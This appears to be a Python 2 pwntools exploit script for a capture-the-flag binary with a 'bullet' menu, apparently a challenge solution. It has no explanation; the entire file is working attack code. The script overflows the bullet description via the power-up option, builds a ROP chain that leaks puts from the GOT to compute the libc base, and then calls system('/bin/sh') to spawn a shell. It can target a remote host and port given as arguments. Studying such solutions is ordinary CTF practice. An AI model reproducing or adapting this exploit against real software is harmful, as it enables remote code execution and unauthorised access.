#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Your choice :', str(index))

def create_bullet(content):
    menu(1)
    p.sa('Give me your description of bullet :', content)

def power_up(content):
    menu(2)
    p.sa('Give me your another description of bullet :', content)

if __name__ == '__main__':
    create_bullet('a' * 0x2f)
    power_up('a')
    #gogogo('x /20dx 0xffffde34')
    start_addr = 0x080484F0
    #bc(0x08048989)
    power_up('\xff\xff\x7f' + flat('a' * 4, elf.plt['puts']+4, start_addr, elf.got['puts']))
    menu(3)
    menu(3)
    p.ru('win !!\n')
    puts_addr = u32(p.r(4))
    libc.address = puts_addr - libc.sym['puts']
    create_bullet('a' * 0x2f)
    power_up('a')
    power_up('\xff\xff\x7f' + flat('a' * 4, libc.sym['system'], 0xdeadbeef, libc.search('/bin/sh').next()))
    menu(3)
    bc(0x08048A19)
    menu(3)
    p.i()
